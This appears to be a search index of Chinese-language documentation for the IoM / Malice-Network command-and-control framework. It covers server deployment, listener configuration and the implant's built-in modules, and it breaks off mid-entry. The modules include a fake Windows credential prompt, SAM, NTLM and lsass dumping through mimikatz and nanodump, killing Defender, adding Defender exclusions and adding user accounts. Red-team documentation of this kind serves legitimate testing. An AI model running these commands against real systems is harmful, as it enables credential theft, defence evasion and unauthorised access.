<p>\u8fd0\u884c\u811a\u672c\u65f6\uff0c\u5c06\u901a\u8fc7\u4ea4\u4e92\u547d\u4ee4\u884c\u63d0\u4f9b\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <p>\u5b89\u88c5\u8def\u5f84 \uff1a</p> <ul> <li>\u9700\u8981\u6307\u5b9a\u5b89\u88c5\u7684\u6839\u76ee\u5f55\uff08\u9ed8\u8ba4\u8def\u5f84\u4e3a /iom\uff09\uff1a</li> </ul> <pre><code>Please input the base directory for the installation [default: /iom]:\n</code></pre> <p>IP \u5730\u5740\uff1a</p> <ul> <li>install.sh \u4f1a\u81ea\u52a8\u68c0\u6d4b\u9ed8\u8ba4 IP \u5e76\u63d0\u793a\uff1a</li> </ul> <pre><code>Please input your IP Address for the server to start [default: &lt;\u81ea\u52a8\u68c0\u6d4b\u7684IP&gt;]:\n</code></pre> install.sh \u5c06\u81ea\u52a8\u5b8c\u6210\u4ee5\u4e0b\u4efb\u52a1\uff1a <ol> <li>\u68c0\u67e5\u5e76\u5b89\u88c5 Docker\u3002</li> <li>\u4e0b\u8f7d\u5e76\u5b89\u88c5 Malice-Network \u670d\u52a1\u7aef\u53ca\u5ba2\u6237\u7aef, \u5e76\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf</li> <li>\u4e0b\u8f7d\u5e76\u5b89\u88c5 Malefic \u6e90\u7801\u53ca\u5de5\u5177</li> <li>\u62c9\u53d6\u5fc5\u8981\u7684 Docker \u955c\u50cf, \uff08\u9700\u8981\u5927\u7ea68.21GB \u7a7a\u95f4, \u6211\u4eec\u6b63\u5728\u5c1d\u8bd5\u4f18\u5316\uff09         - <code>ghcr.io/chainreactors/malefic-builder:latest</code></li> <li>\u914d\u7f6e\u5e76\u542f\u52a8 Malice-Network \u670d\u52a1\uff08\u57fa\u4e8e <code>systemd</code>\uff09\u3002</li> </ol>"},{"location":"IoM/guideline/deploy/#\u4e0b\u8f7drelease\u90e8\u7f72","title":"\u4e0b\u8f7drelease\u90e8\u7f72","text":"<p>\u5982\u679c\u5728windows\u6216\u8005macos\u7cfb\u7edf\u4e0a\u90e8\u7f72server\uff0c\u5219\u524d\u5f80IoM\u4ed3\u5e93\u4e0b\u8f7d\u5bf9\u5e94\u7684server release\u3002</p> <p></p> <p>\u5176\u4e2dIoM\u4e3aclient\u7aef\uff0cmalice_network\u4e3aserver\u7aef\u3002</p> <p>\u4e0b\u8f7d\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u542f\u52a8\u670d\u52a1\u7aef\u3002</p> <pre><code>./malice-network\n</code></pre> <p>\u5982\u679c\u9700\u8981server\u4ee5\u6307\u5b9aip\u542f\u52a8\uff0c\u5219\u4f7f\u7528<code>-i</code> \u53c2\u6570\u6765\u6307\u5b9aip\u3002</p> <pre><code>./malice-network -i 123.123.123.123\n</code></pre>"},{"location":"IoM/guideline/deploy/#\u5e38\u7528\u914d\u7f6e\u4fee\u6539","title":"\u5e38\u7528\u914d\u7f6e\u4fee\u6539","text":"<p>config.yaml\u662fserver\u7aef\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e9bserver\u4ee5\u53ca <code>listener</code> \u53ef\u9009\u7684\u914d\u7f6e\u3002 \u82e5\u9700\u8981\u4fee\u6539\u914d\u7f6e\uff0c\u9700\u8981\u63d0\u524d\u5230 https://github.com/chainreactors/malice-network/blob/master/server/config.yaml \u4e0b\u8f7dconfig.yaml\uff0c\u5e76\u653e\u5230server\u7aef\u53ef\u6267\u884c\u6587\u4ef6\u7684\u540c\u7ea7\u76ee\u5f55\u4e0b\u3002</p> <p>\u5728config.yaml\u4e2d\u53ef\u4ee5\u901a\u8fc7server\u4e0b\u7684 <code>ip</code> \u5b57\u6bb5\u6765\u4fee\u6539server\u6307\u5b9a\u7684\u5916\u7f51ip\u3002</p> <pre><code>server:\n  ip: 127.0.0.1\n</code></pre> <p>\u5f53\u5728\u4f20\u8f93\u5927\u6587\u4ef6\u65f6\u6216\u8005\u7f51\u7edc\u73af\u5883\u8f83\u5dee\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539config\u4e0b\u7684 <code>packet_length</code> \u5b57\u6bb5\u6765\u8c03\u6574server\u4e0elistener\u4e4b\u95f4\u7684\u901a\u4fe1\u6570\u636e\u5305\u5927\u5c0f\u3002</p> <pre><code>config:\n  packet_length: 10485760   # 10M\n</code></pre> <p>IoM\u8fd8\u652f\u6301\u4e86\u7b2c\u4e09\u65b9\u6d88\u606f\u901a\u77e5\uff0c\u76ee\u524d\u652f\u6301\u4e86telegram\uff0c\u9489\u9489\uff0c\u98de\u4e66\u548c\u5fae\u4fe1\u7b49\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u3002\u53ef\u4ee5\u5728config.yaml\u4e2d\u7684 <code>notify</code> \u5b57\u6bb5\u6765\u914d\u7f6e\u3002 <pre><code>  notify:\n    enable: false \n    telegram:         # telegram \u914d\u7f6e\n      enable: false\n      api_key:        # telegram api-key\n      chat_id:        # telegram \u804a\u5929id\n    dingtalk:         # \u9489\u9489\u6d88\u606f\u914d\u7f6e\n      enable: false\n      secret:         # \u9489\u9489\u7b2c\u4e09\u65b9secret\n      token:          # \u9489\u9489\u7b2c\u4e09\u65b9token\n    lark:             # \u98de\u4e66\u6d88\u606f\u914d\u7f6e\n      enable: false\n      webhook_url:    # \u98de\u4e66\u673a\u5668\u4ebawebhook_url\n    serverchan:       # serverchan \u5fae\u4fe1\u63a8\u9001\u914d\u7f6e\n      enable: false\n      url:            # serverchan api key\n    pushplus:         # PushPlus \u6d88\u606f\u914d\u7f6e\n      enable: false   # \u662f\u5426\u542f\u7528 PushPlus\n      token:          # PushPlus Token\n      topic:          # \u6d88\u606f\u4e3b\u9898\n      channel:        # \u63a8\u9001\u6e20\u9053\uff0c\u53ef\u9009: wechat, email, telegram \u7b49\n</code></pre></p> <p>\u5173\u4e8elistener\u548c\u7f16\u8bd1\u7684\u914d\u7f6e\u5728listener\u548cpayload\u4e2d\u8bf4\u660e\u3002</p>"},{"location":"IoM/guideline/deploy/#\u542f\u52a8\u5ba2\u6237\u7aef","title":"\u542f\u52a8\u5ba2\u6237\u7aef","text":"<p>\u670d\u52a1\u7aef\u542f\u52a8\u540e\u4f1a\u751f\u6210\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6, \u5206\u522b\u4e3a<code>listener.auth</code> \u548c<code>admin_[server_ip].auth</code>\uff0c\u5c06\u751f\u6210\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6, \u9ed8\u8ba4\u4e3a <code>admin_[server_ip].auth</code> \u590d\u5236\u5230 <code>Malice-Network</code> \u5ba2\u6237\u7aef\u7684\u6240\u5728\u4f4d\u7f6e\u3002\u4f7f\u7528\u65b0\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u6307\u4ee4\u542f\u52a8\u5ba2\u6237\u7aef\uff1a</p> <pre><code>.\\iom login [admin_ip.auth]\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u540e\uff0c\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u4f7f\u7528\u65b0\u7684\u5ba2\u6237\u914d\u7f6e\u6587\u4ef6\u4e0e\u670d\u52a1\u5668\u8fde\u63a5\uff0c\u5e76\u5c06\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u79fb\u52a8\u81f3\u5ba2\u6237\u7aef\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u5939 (Windows \u4e0b\u4e3a <code>C:\\Users\\user\\.config\\malice\\configs</code>, Linux \u4e3a <code>/home/[username]/.config/malice/configs</code>\uff0cMacOS  \u4e3a <code>/Users/[username]/.config/malice/configs</code>\uff09</p> <p>\u4e0b\u6b21\u767b\u5f55\u540e\uff0c\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u663e\u793a\u5728\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u5939\u4e0b\u6240\u6709\u7684\u7528\u6237\u914d\u7f6e\uff0c\u6839\u636e\u9700\u6c42\uff0c\u9009\u62e9\u5bf9\u5e94\u7684\u7528\u6237\u8fdb\u884c\u9009\u62e9\u3002</p> <pre><code>./iom\n</code></pre> <p></p>"},{"location":"IoM/guideline/deploy/#\u5b89\u88c5gui","title":"\u5b89\u88c5gui","text":""},{"location":"IoM/guideline/deploy/#\u4e0b\u8f7d\u6587\u4ef6","title":"\u4e0b\u8f7d\u6587\u4ef6","text":"<p>\u4ece malice-network\u4ed3\u5e93 \u4e2d\u7684release\u4e2d\u4e0b\u8f7d\u5bf9\u5e94\u7684vscode\u63d2\u4ef6<code>iom.vsix</code> \u4ee5\u53caclient\u6587\u4ef6</p> <p></p>"},{"location":"IoM/guideline/deploy/#\u4ece\u6587\u4ef6\u5b89\u88c5vscode\u63d2\u4ef6","title":"\u4ece\u6587\u4ef6\u5b89\u88c5vscode\u63d2\u4ef6","text":"<p>\u6253\u5f00extension\u6216ctrl+sheft+x \u5e76\u5355\u51fb\u5982\u56fe\u6240\u793a</p> <p></p>"},{"location":"IoM/guideline/deploy/#\u914d\u7f6evscode\u63d2\u4ef6","title":"\u914d\u7f6eVSCODE\u63d2\u4ef6","text":"<p>IoM:\u00a0Executable Path \u586b\u5165\u4ecerelease\u4e0b\u8f7d\u7684iom\u4e8c\u8fdb\u5236\u7a0b\u5e8f</p> <p></p>"},{"location":"IoM/guideline/deploy/#\u6253\u5f00iom-\u63d2\u4ef6","title":"\u6253\u5f00IoM \u63d2\u4ef6","text":"<p>IoM\u9700\u8981 malice-network\u751f\u6210\u7684.auth\u51ed\u8bc1, \u6240\u4ee5\u5728\u8fd9\u4e00\u6b65\u4e4b\u524d\u8bf7\u5148\u81ea\u884c\u642d\u5efa\u597dserver</p> <p>\u53ef\u4ee5\u53c2\u8003quickstart\u6587\u6863\u5feb\u901f\u642d\u5efaserver</p> <p>\u5b89\u88c5server\u7684\u547d\u4ee4\u9700\u8981\u4fee\u6539\u4e3a: <pre><code>curl -L \"https://raw.githubusercontent.com/chainreactors/malice-network/master/install.sh\" -o install.sh\nbash install.sh\n</code></pre></p> <p></p> <p>\u5982\u679c\u5df2\u7ecf\u901a\u8fc7client\u8fde\u63a5\u8fc7server\uff0c \u5219\u4f1a\u76f4\u63a5\u663e\u793a\u5386\u53f2\u8fde\u63a5\u8fc7\u7684auth\u6587\u4ef6. \u5355\u51fb\u5373\u53ef\u8fdb\u5165\u5230\u4ea4\u4e92\u754c\u9762. </p> <p>\u8bf7\u6ce8\u610fserver\u7248\u672c,client\u7248\u672c,gui\u7248\u672c\u4e00\u81f4</p> <p></p> <p>\u66f4\u5177\u4f53\u7684\u90e8\u7f72\u6587\u6863\u5728deploy\u4e2d\u8bf4\u660e</p>"},{"location":"IoM/guideline/embed_mal/","title":"\u5185\u7f6e\u63d2\u4ef6","text":""},{"location":"IoM/guideline/embed_mal/#embed-mal","title":"embed mal","text":"<p>\u5728 IoM \u7684 v0.1.1 \u4e2d\u96c6\u6210\u4e86\u4e00\u7cfb\u5217\u5185\u7f6e\u7684 embed \u529f\u80fd: </p> <p>\u53ef\u4ee5\u5728embed \u7684\u8be6\u7ec6\u6587\u6863\u4e2d\u627e\u5230\u6240\u6709\u7684\u76f8\u5173\u547d\u4ee4</p>"},{"location":"IoM/guideline/embed_mal/#askcreds","title":"askcreds","text":"<p>askcres\u662f\u4e00\u4e2aWindows\u51ed\u8bc1\u7a83\u53d6\u529f\u80fd\uff0c\u901a\u8fc7\u4f2a\u9020 Windows \u5b89\u5168\u5f39\u7a97\u8bf1\u9a97\u7528\u6237\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002</p> <pre><code>askcreds [-p prompt] [-n note] [-t wait_time]\n</code></pre> <ul> <li>--note: note to display (default:  Please verify your Windows user credentials to proceed )</li> <li>--prompt: prompt to display (default:  Restore Network Connection )</li> <li>--wait_time: password to dump credentials for (default:  30 )</li> </ul> <p></p> <p>windows\u4f1a\u5f39\u51fa\u5982\u4e0b\u7a97\u53e3</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#autologon","title":"autologon","text":"<p>autologon \u7528\u4e8e\u83b7\u53d6 Windows \u81ea\u52a8\u767b\u5f55\u7684\u51ed\u636e</p> <pre><code>autologon\n</code></pre> <p></p>"},{"location":"IoM/guideline/embed_mal/#credman","title":"credman","text":"<p>credman \u7528\u4e8e\u83b7\u53d6 Windows Credential Manager \u4e2d\u7684\u51ed\u636e</p> <pre><code>credman\n</code></pre> <p></p>"},{"location":"IoM/guideline/embed_mal/#curl","title":"curl","text":"<p>curl \u7528\u4e8e\u53d1\u9001 HTTP \u8bf7\u6c42, \u652f\u6301 GET/POST/PUT/PATCH/DELETE\u7684\u5e38\u89c1\u65b9\u6cd5\uff0c\u4ee5\u53ca\u81ea\u5b9a\u4e49 header/useragent</p> <pre><code>curl --host [host] --port [port] --method [method] --header [header] --body [body] --useragent [useragent] --noproxy\n</code></pre> <p>Flags\u5982\u4e0b</p> <ul> <li>--body: request body (default: ``)</li> <li>--disable-output: disable output display (default:  false )</li> <li>--header: custom header (default: ``)</li> <li>--host: target host (default: ``)</li> <li>--method: HTTP method (GET, POST, PUT, PATCH, DELETE) (default:  GET )</li> <li>--noproxy: disable proxy usage (default:  false )</li> <li>--port: target port (default:  0 )</li> <li>--useragent: custom user agent (default: ``)</li> </ul> <p></p>"},{"location":"IoM/guideline/embed_mal/#dir","title":"dir","text":"<p>dir \u7528\u4e8e\u5217\u51fa\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6 <pre><code>dir --path [path] --subdirs\n</code></pre> Flags\u5982\u4e0b\uff1a</p> <ul> <li>--path: directory path to list (default:  `` )</li> <li>--subdirs: include subdirectories (optional) (default:  false )</li> </ul> <p></p>"},{"location":"IoM/guideline/embed_mal/#dump_sam","title":"dump_sam","text":"<p>dump_sam \u7528\u4e8e\u5bfc\u51fa SAM, SECURITY, SYSTEM \u4e09\u4e2a\u6ce8\u518c\u8868\u6587\u4ef6 <pre><code>dump_sam --location [location]\n</code></pre> Flags\u5982\u4e0b\uff1a - --location: folder to save (optional) (default:  C:\\Windows\\Temp )</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#enum","title":"enum","text":"<p>enum \u7528\u4e8e\u679a\u4e3e\u5e38\u89c1\u7684\u4fe1\u606f, \u5305\u62ec arp, dc, dns, dotnet_process, drives, files, localcert, localsessions \u7b49</p> <p></p> <p>\u5168\u90e8\u7528\u6cd5\u5982\u4e0b:</p> <pre><code>enum arp # \u679a\u4e3earp\u8868\nenum dc # \u679a\u4e3e\u57df\u4fe1\u606f\nenum dns # \u679a\u4e3edns\u914d\u7f6e\nenum dotnet_process # \u679a\u4e3edotnet\u8fdb\u7a0b\nenum drives # \u679a\u4e3e\u9a71\u52a8\u5668\nenum files # \u679a\u4e3e\u6587\u4ef6\nenum localcert # \u679a\u4e3e\u672c\u5730\u8bc1\u4e66\nenum localsessions # \u679a\u4e3e\u672c\u5730\u4f1a\u8bdd\n</code></pre> <p></p>"},{"location":"IoM/guideline/embed_mal/#exclusion","title":"exclusion","text":"<p>exclusion \u7528\u4e8e\u7ba1\u7406 Windows Defender \u7684\u6392\u9664\u9879</p> <pre><code>exclusion add # \u6dfb\u52a0\u6392\u9664\u9879\nexclusion delete # \u5220\u9664\u6392\u9664\u9879\nexclusion enum # \u679a\u4e3e\u6392\u9664\u9879\n</code></pre> <ul> <li>--data \u8868\u793a\u8def\u5f84/\u8fdb\u7a0b/\u6269\u5c55\u540d</li> <li>--type \u8868\u793a\u6392\u9664\u9879\u7684\u7c7b\u578b, \u53ef\u4ee5\u662f path/process/extension</li> </ul> <p></p>"},{"location":"IoM/guideline/embed_mal/#hashdump","title":"hashdump","text":"<p>hashdump \u7528\u4e8e\u63d0\u53d6Windows\u672c\u5730\u7528\u6237\u7684NTLM\u5bc6\u7801\u54c8\u5e0c <pre><code>hashdump\n</code></pre> </p>"},{"location":"IoM/guideline/embed_mal/#ipconfig","title":"ipconfig","text":"<p>ipconfig \u7528\u4e8e\u663e\u793a\u7f51\u7edc\u914d\u7f6e <pre><code>ipconfig\n</code></pre> </p>"},{"location":"IoM/guideline/embed_mal/#kill_defender","title":"kill_defender","text":"<p>kill_defender \u7528\u4e8e\u6740\u6b7b\u6216\u68c0\u67e5 Windows Defender <pre><code>kill_defender --action [action]\n</code></pre> Flags\u5982\u4e0b\uff1a - --action \u8868\u793a\u52a8\u4f5c, \u53ef\u4ee5\u662f kill/check</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#klist","title":"klist","text":"<p>klist \u7528\u4e8e\u4e0e\u7f13\u5b58\u7684 Kerberos \u7968\u636e\u4ea4\u4e92 <pre><code>klist --action [action] --spn [spn]\n</code></pre> Flags\u5982\u4e0b\uff1a - --action \u8868\u793a\u52a8\u4f5c, \u53ef\u4ee5\u662f get/purge/empty - --spn \u8868\u793a\u76ee\u6807 SPN, \u5f53\u52a8\u4f5c\u662f get \u65f6\u9700\u8981\u6307\u5b9a</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#ldapsearch","title":"ldapsearch","text":"<p>ldapsearch \u7528\u4e8e\u6267\u884c LDAP \u67e5\u8be2 <pre><code>ldapsearch --query [query] --attributes [attributes] --result-count [result-count] --hostname [hostname] --domain [domain]\n</code></pre> Flags\u5982\u4e0b\uff1a - --query \u8868\u793a\u67e5\u8be2\u8bed\u53e5 - --attributes \u8868\u793a\u67e5\u8be2\u7684\u5c5e\u6027 - --result-count \u8868\u793a\u67e5\u8be2\u7ed3\u679c\u7684\u6570\u91cf - --hostname \u8868\u793a\u67e5\u8be2\u7684\u4e3b\u673a\u540d - --domain \u8868\u793a\u67e5\u8be2\u7684\u57df\u540d</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#logonpassowrds","title":"logonpassowrds","text":"<p>embed \u901a\u8fc7\u5185\u7f6e mimikatz \u5b9e\u73b0\u4e86 logonpassowrds </p> <p>\u540c\u65f6\u5bf9\u8be5\u547d\u4ee4\u6dfb\u52a0\u4e86\u89e3\u6790\uff0c\u4f1a\u5728\u6293\u53d6\u7684\u540c\u65f6\u5b58\u50a8\u5230 context/credential \u4e2d </p> <p>\u5982\u679c\u4f60\u9700\u8981\u4e00\u4e2a opsec \u66f4\u9ad8\u7684\u529e\u6cd5,\u53ef\u4ee5\u5c1d\u8bd5 nanodump</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#memoryinfo","title":"memoryinfo","text":"<p>memoryinfo \u7528\u4e8e\u83b7\u53d6\u7cfb\u7edf\u5185\u5b58\u4fe1\u606f <pre><code>memoryinfo\n</code></pre></p> <p></p>"},{"location":"IoM/guideline/embed_mal/#memoryreader","title":"memoryreader","text":"<p>memoryreader \u7528\u4e8e\u4ece\u76ee\u6807\u8fdb\u7a0b\u8bfb\u53d6\u5185\u5b58</p> <p><pre><code>memoryreader --target-pid [target-pid] --pattern [pattern] --output-size [output-size]\n</code></pre> Flags\u5982\u4e0b\uff1a</p> <ul> <li>--target-pid \u8868\u793a\u76ee\u6807\u8fdb\u7a0bID</li> <li>--pattern \u8868\u793a\u5185\u5b58\u6a21\u5f0f</li> <li>--output-size \u8868\u793a\u8f93\u51fa\u5927\u5c0f</li> </ul> <p></p>"},{"location":"IoM/guideline/embed_mal/#mimikatz","title":"mimikatz","text":"<p>mimikatz \u7528\u4e8e\u6267\u884c mimikatz \u547d\u4ee4, \u7528\u6cd5\u4e0e\u5355\u884c\u7684mimikatz\u4e00\u81f4\u3002</p> <pre><code>mimikatz [command1] [command2] ...\nmimikatz \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \n</code></pre> <p>(\u6ce8\u610fexit\u9000\u51fa\u5df2\u7ecf\u9ed8\u8ba4\u6dfb\u52a0\u5230\u7ed3\u5c3e, \u4e0d\u9700\u8981\u624b\u52a8\u6dfb\u52a0, \u4e0a\u8ff0\u547d\u4ee4\u7b49\u4ef7\u4e8e<code>mimikatz \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"</code></p> <p></p>"},{"location":"IoM/guideline/embed_mal/#nanodump","title":"nanodump","text":"<p>nanodump \u7528\u4e8e\u5bfc\u51fa lsass \u5185\u5b58\u8f6c\u50a8 <pre><code>nanodump --options [options]\n</code></pre> Flags\u5982\u4e0b\uff1a - --options \u8868\u793a nanodump \u7684\u53c2\u6570, \u4e0e\u5355\u884c\u7684 nanodump \u4e00\u81f4</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#net","title":"net","text":"<p>net \u7528\u4e8e\u6267\u884c net \u547d\u4ee4, \u7528\u6cd5\u4e0e\u5355\u884c\u7684 net \u4e00\u81f4\u3002</p> <p>net user add \u7528\u4e8e\u6dfb\u52a0\u7528\u6237 <pre><code>net user add --username [username] --password [password]\nnet user enum # \u679a\u4e3e\u7528\u6237\n</code></pre></p> <p></p> <p>net user query \u53ef\u4ee5\u67e5\u8be2\u7528\u6237\u4fe1\u606f <pre><code>net user query --username [username] --domain [domain](optional)\n</code></pre></p> <p></p>"},{"location":"IoM/guideline/embed_mal/#nslookup","title":"nslookup","text":"<p>nslookup \u7528\u4e8e\u6267\u884c nslookup \u547d\u4ee4, \u7528\u6cd5\u4e0e\u539f\u751f\u7684 nslookup \u57fa\u672c\u4e00\u81f4\u3002</p> <pre><code>nslookup [host] [server] # \u7b80\u5355\u67e5\u8be2\nnslookup --host [host] --server [server] --record-type [record-type] # \u5e26\u53c2\u6570\u67e5\u8be2\n</code></pre> <p>Flags\u5982\u4e0b\uff1a - --host \u8868\u793a\u76ee\u6807\u4e3b\u673a - --server \u8868\u793a DNS \u670d\u52a1\u5668 - --record-type \u8868\u793a\u8bb0\u5f55\u7c7b\u578b(A, NS, CNAME, MX, AAAA, etc.)</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#pingscan","title":"pingscan","text":"<p>pingscan \u7528\u4e8e\u6267\u884c ping \u626b\u63cf.</p> <p><pre><code>pingscan --target [target]\n</code></pre> Flags\u5982\u4e0b\uff1a - --target \u8868\u793a\u76ee\u6807\u4e3b\u673a(\u53ef\u4ee5\u53c2\u8003\u7684\u683c\u5f0f\u6709 192.168.1.1, 192.168.1.1-192.168.1.255, 192.168.1.0/24)</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#port-scan","title":"port scan","text":"<p>portscan \u7528\u4e8e\u6267\u884c\u7aef\u53e3\u626b\u63cf.</p> <pre><code>portscan --target [target] --ports [ports]\n</code></pre> <p>Flags\u5982\u4e0b\uff1a - --target \u8868\u793a\u76ee\u6807\u4e3b\u673a(\u53ef\u4ee5\u53c2\u8003\u7684\u683c\u5f0f\u6709 192.168.1.1, 192.168.1.1-192.168.1.255, 192.168.1.0/24) - --ports \u8868\u793a\u76ee\u6807\u7aef\u53e3(\u53ef\u4ee5\u53c2\u8003\u7684\u683c\u5f0f\u6709 80,443,8080 \u6216 1-1000)</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#readfile","title":"readfile","text":"<p>readfile \u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 <pre><code>readfile --filepath [filepath]\n</code></pre> Flags\u5982\u4e0b\uff1a - --filepath \u8868\u793a\u76ee\u6807\u6587\u4ef6\u8def\u5f84</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#route","title":"route","text":"<p>route \u7528\u4e8e\u8f93\u51fa\u8def\u7531\u8868</p> <pre><code>route print\n</code></pre> <p></p>"},{"location":"IoM/guideline/embed_mal/#screenshot","title":"screenshot","text":"<p>screenshot \u7528\u4e8e\u622a\u5c4f</p> <pre><code>screenshot --filename [filename]\n</code></pre> <p>Flags\u5982\u4e0b\uff1a - --filename \u8868\u793a\u622a\u5c4f\u6587\u4ef6\u540d(\u9ed8\u8ba4\u4e3a screenshot.jpg)</p> <p></p>"},{"location":"IoM/guideline/embed_mal/#systeminfo","title":"systeminfo","text":"<p>systeminfo \u7528\u4e8e\u8f93\u51fa\u7cfb\u7edf\u4fe1\u606f</p> <pre><code>systeminfo\n</code></pre> <p></p>"},{"location":"IoM/guideline/embed_mal/#wifi","title":"wifi","text":"<p>wifi \u7528\u4e8e\u7ba1\u7406 WiFi \u8fde\u63a5</p> <pre><code>wifi enum # \u679a\u4e3eWiFi\nwifi dump --profilename [profilename] # \u5bfc\u51faWiFi\u8be6\u7ec6\u914d\u7f6e\n</code></pre> <p>Flags\u5982\u4e0b\uff1a - --profilename \u8868\u793a WiFi \u540d\u79f0</p> <p></p> <p></p>"},{"location":"IoM/guideline/embed_mal/#load_prebuild","title":"load_prebuild","text":"<p>\u6309\u7167\u547d\u4ee4\u7684\u5206\u7ec4\u9884\u6253\u5305\u4e86\u5404\u4e2a\u5206\u7ec4\u7684 module, \u7528\u6765\u52a8\u6001\u52a0\u8f7d. \u5305\u62ec</p> <ul> <li>full</li> <li>fs</li> <li>sys</li> <li>rem</li> <li>net</li> <li>execute</li> </ul> <p>\u5982\u679c\u7f16\u8bd1\u7684 nano \u7684 implant\uff0c \u53ef\u4ee5\u4fbf\u6377\u70ed\u52a0\u8f7d\u5bf9\u5e94\u7684\u529f\u80fd</p> <p></p>"},{"location":"IoM/guideline/listener/","title":"Listener","text":"<p>Listener \u662f IoM \u4e2d\u7684\u5206\u5e03\u5f0f\u76d1\u542c\u670d\u52a1\uff0c\u8d1f\u8d23\u4e0e Implant \u5efa\u7acb\u548c\u7ef4\u6301\u5b9e\u9645\u7684\u901a\u4fe1\u3002</p> <ul> <li> <p>\u5206\u5e03\u5f0f\u90e8\u7f72\uff1a\u53ef\u4ee5\u90e8\u7f72\u5728\u4efb\u610f\u670d\u52a1\u5668\u4e0a\uff0c\u800c\u4e0d\u662f\u548cIoM Server\u7ed1\u5b9a\u3002</p> </li> <li> <p>\u4e0e Server \u89e3\u8026\uff1a\u901a\u8fc7 gRPC Stream \u4e0e Server \u5168\u53cc\u5de5\u901a\u4fe1\uff0c\u5b9e\u73b0\u72ec\u7acb\u8fd0\u884c\u548c\u6545\u969c\u9694\u79bb\u3002</p> </li> <li> <p>\u591a\u5f62\u6001\u652f\u6301\uff1a\u53ef\u6839\u636e\u9700\u8981\u4f2a\u88c5\u6216\u9690\u85cf\u901a\u4fe1\u65b9\u5f0f\u3002</p> </li> <li> <p>\u5b9e\u65f6\u4ea4\u4e92\uff1a\u4fdd\u6301 Implant \u4e0e Server \u7684\u5b9e\u65f6\u53cc\u5411\u901a\u4fe1\u3002</p> </li> </ul> <p>Tip</p> <p>\u5177\u4f53\u67b6\u6784\u5728listener\u67b6\u6784\u67e5\u770b</p>"},{"location":"IoM/guideline/listener/#listener-\u914d\u7f6e","title":"listener \u914d\u7f6e","text":"<p>listener\u76ee\u524d\u6709\u4e24\u79cd\u65b9\u5f0f\u63a7\u5236\uff0cconfig.yaml\u548croot\u547d\u4ee4\u884c\u3002config.yaml\u80fd\u591f\u914d\u7f6e\u66f4\u591a\u7684listener\u76f8\u5173\u4fe1\u606f\uff0croot\u547d\u4ee4\u884c\u53ea\u80fd\u8d1f\u8d23listener\u7684\u65b0\u589e\u3001\u5220\u9664\u548c\u5c55\u793a\u3002</p> <p>\u5f53\u9700\u8981\u4fee\u6539listener\u7684\u5916\u7f51ip\u65f6\uff0c\u901a\u8fc7\u4fee\u6539\u5bf9\u5e94listener\u7684 <code>ip</code> \u5b57\u6bb5\u6765\u4fee\u6539\u3002</p> <pre><code>listeners:\n  name: listener  \n  ip: 127.0.0.1  \n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u7aef\u7684\u542f\u52a8\u53c2\u6570 <code>-i</code> \uff0c\u91cd\u65b0\u542f\u52a8\u670d\u52a1\u7aef\u6765\u91cd\u8f7dip\u3002</p> <pre><code>./malice-network -i 123.123.123.123\n</code></pre> <p>\u5f53listener\u7684\u51ed\u8bc1\u4fe1\u606f\u9700\u8981\u91cd\u65b0\u6307\u5b9a\u65f6\uff0c\u901a\u8fc7listener\u7684 <code>auth</code> \u5b57\u6bb5\u6765\u4fee\u6539\u51ed\u8bc1\u6587\u4ef6\u5730\u5740\u3002</p> <pre><code>listeners:\n  name: listener\n  auth: listener.auth  \n</code></pre>"},{"location":"IoM/guideline/listener/#listener-root-\u547d\u4ee4\u7ba1\u7406","title":"listener root \u547d\u4ee4\u7ba1\u7406","text":"<p>\u5f53\u60a8\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684listener\uff0c \u5728\u786e\u4fdd Malice-Network \u670d\u52a1\u5668\u5df2\u7ecf\u8fd0\u884c\u540e\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u4ee5\u4e0b\u6307\u4ee4\uff1a</p> <pre><code>.\\malice-network listener add [listener_name]\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u6210\u529f\u540e\uff0c\u670d\u52a1\u7aef\u4f1a\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\u5e76\u5728\u6240\u5904\u6587\u4ef6\u5939\u4e0b\u751f\u6210\u5bf9\u5e94 auth \u914d\u7f6e\u6587\u4ef6\uff1a</p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5220\u9664listerner</p> <pre><code>.\\malice-network listener del 